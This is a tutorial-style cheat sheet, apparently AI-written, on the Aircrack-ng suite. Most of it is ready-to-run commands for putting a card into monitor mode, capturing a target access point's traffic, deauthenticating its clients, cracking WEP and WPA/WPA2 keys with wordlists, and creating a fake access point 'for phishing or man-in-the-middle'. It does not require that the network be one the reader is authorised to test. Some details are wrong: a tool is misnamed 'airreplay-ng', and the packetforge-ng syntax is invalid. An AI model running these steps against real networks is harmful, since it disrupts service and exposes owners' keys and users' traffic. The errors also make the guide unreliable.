### **Aircrack-ng Tool: Overview & Commands**

**Aircrack-ng** is a powerful suite of tools used for wireless network security assessments, specifically focused on cracking WEP and WPA-PSK keys. It is highly used in penetration testing and network security audits to test the strength of wireless network encryption.

### **Aircrack-ng Tool Suite Components:**
1. **airmon-ng** - For enabling monitor mode on wireless interfaces.
2. **airodump-ng** - Captures raw packets from wireless networks, including WPA/WEP handshakes.
3. **airolib-ng** - Used to manage WPA2/PSK password cracking.
4. **aircrack-ng** - The actual tool used to crack WEP and WPA-PSK keys from captured traffic.
5. **airreplay-ng** - Used to inject packets to a network (used for attack purposes, such as deauthentication).
6. **airtun-ng** - Creates virtual interfaces for tunneling.
7. **packetforge-ng** - Used for crafting custom packets to inject into a network.

### **How to Install Aircrack-ng on Kali Linux:**
Aircrack-ng is pre-installed on Kali Linux, but if you need to install it manually, use the following command:
```bash
sudo apt-get install aircrack-ng
```

### **1. Enabling Monitor Mode (airmon-ng):**
To perform wireless attacks, the wireless interface must be in **monitor mode**. This can be done using `airmon-ng`.

#### Command:
```bash
sudo airmon-ng start wlan0
```
- This puts the **wlan0** interface into monitor mode, which is necessary for sniffing packets.
- Afterward, the interface will be named something like **wlan0mon**.

To stop monitor mode:
```bash
sudo airmon-ng stop wlan0mon
```

### **2. Scanning for Wireless Networks (airodump-ng):**
Once the interface is in monitor mode, you can use `airodump-ng` to discover nearby wireless networks and capture packets, including WPA handshakes.

#### Command to scan networks:
```bash
sudo airodump-ng wlan0mon
```
- This will display a list of all nearby wireless networks.
- The important fields are:
  - **BSSID**: The MAC address of the access point.
  - **ESSID**: The name of the Wi-Fi network.
  - **CH**: The channel the network is using.
  - **Encryption**: WEP/WPA/WPA2, etc.

#### Command to capture packets from a specific AP:
```bash
sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [output_file] wlan0mon
```
- Replace `[BSSID]` with the target AP’s BSSID.
- Replace `[CHANNEL]` with the AP’s channel (found in the scan results).
- Replace `[output_file]` with the desired output file name.

This command will capture all packets to and from the target AP into the file specified.

### **3. Deauthentication Attack (airreplay-ng):**
You can use the **deauthentication attack** to disconnect clients from the target network. This is useful when trying to capture a WPA handshake.

#### Command:
```bash
sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon
```
- Replace `[BSSID]` with the target AP’s BSSID.
- The number `10` represents how many deauthentication packets you want to send.
- This will disconnect clients from the AP, causing them to reconnect and generate a WPA handshake.

### **4. Cracking WEP (aircrack-ng):**
WEP encryption is considered weak, and it can be cracked easily if you have enough packets. Once you have captured enough packets using `airodump-ng`, use `aircrack-ng` to crack the WEP key.

#### Command:
```bash
sudo aircrack-ng [capture_file].cap
```
- Replace `[capture_file]` with the name of the file where the packets were stored.

### **5. Cracking WPA/WPA2 (aircrack-ng with wordlist):**
To crack WPA/WPA2, you need to capture the handshake first (with `airodump-ng`), and then use **aircrack-ng** along with a wordlist to attempt to crack the password.

#### Command:
```bash
sudo aircrack-ng [capture_file].cap -w [wordlist_file]
```
- Replace `[capture_file]` with the name of the file containing the WPA handshake.
- Replace `[wordlist_file]` with the path to your wordlist file (e.g., `/usr/share/wordlists/rockyou.txt`).

### **6. Aircrack-ng Dictionary Attack (WPA/WPA2):**
You can use a dictionary attack for WPA/WPA2 cracking by providing a wordlist.

#### Example:
```bash
sudo aircrack-ng [capture_file].cap -w /path/to/wordlist.txt
```
If the password is found in the wordlist, **aircrack-ng** will display the WPA key.

### **7. Creating Custom Packets (packetforge-ng):**
With `packetforge-ng`, you can craft custom packets for testing or attacking purposes.

#### Example:
```bash
sudo packetforge-ng --bssid [BSSID] --channel [CHANNEL] --essid [ESSID] --wep -w [output_file].cap
```
- Replace `[BSSID]` with the target AP’s BSSID.
- Replace `[CHANNEL]` with the AP's channel.
- Replace `[ESSID]` with the network name (SSID).
- The `--wep` option creates a WEP packet.

### **8. Creating Fake AP (airbase-ng):**
`airbase-ng` can create a fake access point to lure users into connecting to it. This can be useful for various attacks, like phishing or man-in-the-middle.

#### Example:
```bash
sudo airbase-ng -e "FakeAP" -c 6 wlan0mon
```
- `-e "FakeAP"` specifies the SSID of the fake AP.
- `-c 6` sets the channel of the fake AP to channel 6.

### **9. Cracking WPA/WPA2 Handshake with Pyrit (Optional for Aircrack-ng):**
Pyrit is another tool that can be used to speed up WPA/WPA2 cracking, particularly when utilizing the power of a GPU.

#### Command:
```bash
pyrit -r [capture_file].cap -i [wordlist_file] attack_passthrough
```

### **10. Cracking WPA WPA2 Using Hashcat (GPU Acceleration):**
You can also use **Hashcat** for cracking WPA/WPA2 by utilizing GPUs for high performance.

#### Example:
```bash
hashcat -m 2500 [capture_file].hccapx [wordlist_file]
```
- This is more efficient than using **aircrack-ng** in some cases when you have a powerful GPU.

---

### **Summary of Key Commands:**

1. **Enable Monitor Mode:**
   ```bash
   sudo airmon-ng start wlan0
   ```

2. **Scan for Networks:**
   ```bash
   sudo airodump-ng wlan0mon
   ```

3. **Capture Packets from Target AP:**
   ```bash
   sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [output_file] wlan0mon
   ```

4. **Deauth Attack to Capture Handshake:**
   ```bash
   sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon
   ```

5. **Crack WEP Key:**
   ```bash
   sudo aircrack-ng [capture_file].cap
   ```

6. **Crack WPA/WPA2 Key:**
   ```bash
   sudo aircrack-ng [capture_file].cap -w [wordlist_file]
   ```

7. **Craft Custom Packets:**
   ```bash
   sudo packetforge-ng --bssid [BSSID] --channel [CHANNEL] --essid [ESSID] --wep -w [output_file].cap
   ```

8. **Create Fake Access Point:**
   ```bash
   sudo airbase-ng -e "FakeAP" -c 6 wlan0mon
   ```

### **Conclusion:**
Aircrack-ng is a powerful tool for wireless network security testing. With a wide range of tools within the suite, it is capable of performing network scanning, packet sniffing, WEP/WPA key cracking, and even attacking APs. Proper knowledge and usage of Aircrack-ng can help assess the security of wireless networks.

Let me know if you'd like more information or examples on specific commands!